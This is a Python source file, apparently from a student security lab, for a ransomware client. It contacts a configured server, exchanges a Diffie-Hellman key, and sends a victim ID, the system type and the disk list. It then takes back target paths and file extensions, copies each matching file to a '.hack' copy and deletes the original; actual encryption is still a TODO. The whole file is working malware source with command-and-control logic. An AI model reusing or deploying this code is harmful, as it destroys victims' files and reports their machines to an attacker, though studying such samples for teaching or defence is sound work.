from datetime import datetime
import socket
import hashlib
import sys
import os
import glob
import psutil
import utile.network as net
import utile.message as message
import utile.security as secu
import utile.config as config
import ast


def explore(path):
    """
    Cette fonction récupère tous les chemins des fichiers d'un chemin donné en paramètre
    :param path: str, chemin que la fonction glob utilisera pour retourner les chemins de fichiers
    :return: list, liste contenant tous les chemins des fichiers exploré avec le chemin donné
    """
    chemin_str = fr"{path}"
    path_files = glob.glob(f'{chemin_str}/**/*', recursive=True)

    return path_files


def file_type(path):
    """
    Cette fonction détermine et retourne le type de fichié donné en paramètre
    :param path: str, le chemin du fichier pour lequel on veut savoir le type
    :return: str, le type du fichier
    """

    type_OS = ''

    # Vérifie si le chemin donné correspond à un dossier ou un fichier
    # Si c'est un dossier, on retourne directement 'dir'
    if os.path.isdir(path):
        type_OS = 'dir'
    # Si c'est un fichier
    elif os.path.isfile(path):
        # On détermine son extension avec os.path.splitext
        type_OS = os.path.splitext(path)[1]

    return type_OS


def get_type_system():
    """
    Cette fonction récupère le type de système. La méthode getwindowsversion retournera un int de 1 à 3.
    Si il est a 1, c'est un Workstation, si il est à 2, c'est un autre, si il est a 3, c'est un Server.
    :return: str, le type de système
    """

    num_sys = sys.getwindowsversion().product_type
    type_sys = ''

    if num_sys == 1:
        type_sys = 'WORKSTATION'
    elif num_sys == 2:
        type_sys = 'OTHER'
    elif num_sys == 3:
        type_sys = 'SERVER'

    return type_sys


def get_disk():
    """
    Cette fonction utilise la méthode disk_partitions pour récupérer un objet, sur lequel on utilisera la méthode
    device, ce qui nous retournera à chaque fois les disques. Ceux-ci sont transformés en str et ajoutés à une liste.
    :return: list, contient les disques
    """
    disks = []
    for partition in psutil.disk_partitions():
        temp = str(partition.device)[:-1]
        disks.append(temp)

    return disks


def generate_ID_hash_ransomware():
    """
    Cette fonction récupère l'heure courante et le nom de l'hote pour pouvoir générer et retourner une clé unique qui
    sera l'identifiant du ransomware de la victime
    :return: str, la clé unique générée
    """
    # Concatène le nom de l'hôte et l'heure courante
    key = socket.gethostname() + str(datetime.now().time())
    # Utitilise une fonction de hash (SHA256) sur la concaténation des deux, ce qui donne une clé unique
    hash_victim = str(hashlib.sha256(key.encode()).hexdigest())

    return hash_victim


def chiffrer(path):
    """
    Cette fonction ouvre un fichier en mode binaire et recopie son contenu vers un
    nom de fichier étendu de l'extension .hack avant d'effacer la source
    :param path: str, le chemin du fichier
    """
    with open(f"{path}", "rb") as fichier1:
        content = fichier1.read()

    with open(f"{path}.hack", "xb") as fichier2:
        fichier2.write(content)

    # TODO peut-être chiffrer le contenu du fichier utilisation d'encrypt de config

    os.remove(path)


def main():
    # Initialisation du fichier config
    cfg_file_ransomware = config.load_config('ransomware')
    # if not cfg_file_ransomware:
    #     config.create_config('ransomware')
    #     cfg_file_ransomware = config.load_config('ransomware')
    #     config.set_config(cfg_file_ransomware, 1, 'IP', "localhost")
    #     config.set_config(cfg_file_ransomware, 1, 'PORT', 8443)
    #     config.set_config(cfg_file_ransomware, 1, 'HASH', '')
    #     config.set_config(cfg_file_ransomware, 1, 'CONFIGURE', '')
    #     config.set_config(cfg_file_ransomware, 1, 'DISKS', '')
    #     config.set_config(cfg_file_ransomware, 1, 'PATHS', '')
    #     config.set_config(cfg_file_ransomware, 1, 'FILE_EXT', '')
    #     config.set_config(cfg_file_ransomware, 1, 'FREQ', '')
    #     config.set_config(cfg_file_ransomware, 1, 'STATE', '')
    #     config.save_config(cfg_file_ransomware, 'ransomware')

    # # Reload car posait problème au démarrage sans CFG (crash)
    # cfg_file_ransomware = config.load_config('ransomware')

    # Récupère la valeur FREQ, si FREQ est vide, timeout = 60 secondes
    if not cfg_file_ransomware['FREQ']:
        timeout = 60
    else:
        timeout = cfg_file_ransomware['FREQ']

    # Ouverture d'un serveur avec comme adresse, port et timeout des valeurs du fichier CFG
    socket_serv, gp = net.connect_to_serv(adresse=cfg_file_ransomware['IP'],
                                          port=int(cfg_file_ransomware['PORT']), timeout=timeout)
    # Création d'une clé de chiffrement Diffie Hellman
    key = secu.Diffie_Hellman_exchange_key(socket_serv, gp)

    # Si l'état dans le fichier CFG est Initialize ou n'existe pas
    if cfg_file_ransomware['STATE'] == 'INITIALIZE' or not cfg_file_ransomware['STATE']:

        # Si CFG ne contient pas les disques -> récupération des disques via une fonction
        if not cfg_file_ransomware['DISKS']:
            disks = get_disk()
        # Si CFG contient les disques -> récupération des disques venant du CFG
        else:
            disks = cfg_file_ransomware['DISKS']
        # Récupération du type de système
        sys_type = get_type_system()
        # S'il n'y a pas de HASH dans le CFG, génération d'un hash et sauvegarde dans le fichier
        if not cfg_file_ransomware['HASH']:
            hash_victime = generate_ID_hash_ransomware()
            config.set_config(cfg_file_ransomware, 1, 'HASH', hash_victime)
            config.save_config(cfg_file_ransomware, 'ransomware')
        # Sinon, récupération dans le CFG
        else:
            hash_victime = cfg_file_ransomware['HASH']
        # Création d'un paquet prêt a être envoyé
        packet = message.set_message('INITIALIZE_REQ', [hash_victime, sys_type, disks])
        # Chiffremen du paquet via AES-GCM 256
        crypt_data = secu.AES_GCM_encrypt(packet,
                                          key)  # Je sais qu'il ne faut pas utiliser
        # AES-GCM mais TLS, c'est juste dans une question sécurité temporaire
        # Envoi du paquet chiffré vers le destinataire (serveur frontal)
        net.send_message(socket_serv, crypt_data)
        # Lancement d'un timeout de 20 secondes
        socket_serv.settimeout(20)
        while True:
            try:
                # Essaie de recevoir un message
                # si à la fin du timeout (20secondes) aucun messages n'a été reçu -> va dans except
                recv_data = net.receive_message(socket_serv)
                # S'il le reçoit, il le déchiffre
                decrypted_data = secu.AES_GCM_decrypt(recv_data,
                                                      key)  # Je sais qu'il ne faut pas utiliser
                # AES-GCM mais TLS, c'est juste une question sécurité temporaire
                break
            except:
                # Relance un timeout de 20 secondes et ressaie le try
                socket_serv.settimeout(20)
                continue

        # Isole SETTINGS de initialize_resp pour avoir des lignes plus jolies
        settings_data = decrypted_data['SETTING']

        # Si l'état reçu est INITIALIZE -> Enregistrement des informations dans CFG
        if settings_data['STATE'] == 'INITIALIZE':
            config.set_config(cfg_file_ransomware, 1, 'CONFIGURE', decrypted_data['CONFIGURE'])
            config.set_config(cfg_file_ransomware, 1, 'DISKS', settings_data['DISKS'])
            config.set_config(cfg_file_ransomware, 1, 'PATHS', settings_data['PATHS'])
            config.set_config(cfg_file_ransomware, 1, 'FILE_EXT', settings_data['FILE_EXT'])
            config.set_config(cfg_file_ransomware, 1, 'FREQ', settings_data['FREQ'])
            config.set_config(cfg_file_ransomware, 1, 'STATE', settings_data['STATE'])
            config.save_config(cfg_file_ransomware, 'ransomware')
        # print(decrypted_data)
        # Déconnexion du socket
        if message.get_message_type(decrypted_data) == 'INITIALIZE_RESP':
            net.CloseCon(socket_serv)

        # Point 6 labo 4
        # _______________________

    # Récupère les extensions
    list_extensions = ast.literal_eval(cfg_file_ransomware['FILE_EXT'])
    list_chemins_fichiers = ast.literal_eval(cfg_file_ransomware['PATHS'])
    compteur_fichiers_chiffres = 0

    for fichier in list_chemins_fichiers:
        if file_type(fichier) in list_extensions:
            chiffrer(fichier)
            compteur_fichiers_chiffres += 1


if __name__ == '__main__':
    main()
